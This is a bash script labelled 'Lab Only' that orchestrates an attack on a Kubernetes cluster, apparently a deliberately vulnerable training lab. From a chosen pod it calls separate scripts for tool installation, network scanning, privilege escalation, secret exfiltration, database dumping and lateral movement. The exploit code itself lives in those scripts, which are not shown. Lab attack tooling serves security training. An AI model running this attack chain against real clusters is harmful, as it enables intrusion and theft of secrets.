#!/bin/bash

# Advanced cluster attack script that combines multiple techniques
# - Installs tools, scans network, exploits database, escalates privileges, exfiltrates secrets

set -e

GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
BLUE='\033[0;34m'
NC='\033[0m'

NAMESPACE="${1:-vulnerable-apps}"

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

echo -e "${RED}"
echo "╔══════════════════════════════════════════════════════════════╗"
echo "║           Advanced Cluster Attack Script                     ║"
echo "║                  (Lab Only)                                 ║"
echo "╚══════════════════════════════════════════════════════════════╝"
echo -e "${NC}\n"

# Get a compromised pod (prefer API pod as it has command injection)
COMPROMISED_POD=$(kubectl get pods -n "$NAMESPACE" -l app=vulnerable-api -o jsonpath='{.items[0].metadata.name}' 2>/dev/null)
if [ -z "$COMPROMISED_POD" ]; then
    COMPROMISED_POD=$(kubectl get pods -n "$NAMESPACE" -o jsonpath='{.items[0].metadata.name}' 2>/dev/null)
fi

if [ -z "$COMPROMISED_POD" ]; then
    echo -e "${RED}No pods found in namespace${NC}"
    exit 1
fi

echo -e "${GREEN}Using compromised pod: $COMPROMISED_POD${NC}\n"

# Phase 1: Install tools
echo -e "${BLUE}[Phase 1] Installing security tools...${NC}"
"$SCRIPT_DIR/install-tools-in-container.sh" "$NAMESPACE" "$COMPROMISED_POD"

# Phase 2: Scan cluster
echo -e "\n${BLUE}[Phase 2] Scanning cluster network...${NC}"
"$SCRIPT_DIR/scan-cluster-from-container.sh" "$NAMESPACE" "$COMPROMISED_POD"

# Phase 3: Privilege escalation
echo -e "\n${BLUE}[Phase 3] Attempting privilege escalation...${NC}"
"$SCRIPT_DIR/escalate-privileges-container.sh" "$NAMESPACE" "$COMPROMISED_POD"

# Phase 4: Exfiltrate secrets
echo -e "\n${BLUE}[Phase 4] Exfiltrating secrets...${NC}"
"$SCRIPT_DIR/exfiltrate-secrets.sh" "$NAMESPACE" "$COMPROMISED_POD"

# Phase 5: Database exploitation
echo -e "\n${BLUE}[Phase 5] Exploiting database...${NC}"
"$SCRIPT_DIR/exploit-database-dump.sh" "$NAMESPACE"

# Phase 6: Lateral movement
echo -e "\n${BLUE}[Phase 6] Attempting lateral movement...${NC}"
"$SCRIPT_DIR/lateral-movement.sh" "$NAMESPACE"

echo -e "\n${GREEN}=== Advanced Cluster Attack Complete ===${NC}"
echo -e "${YELLOW}Review the output above for discovered information${NC}"

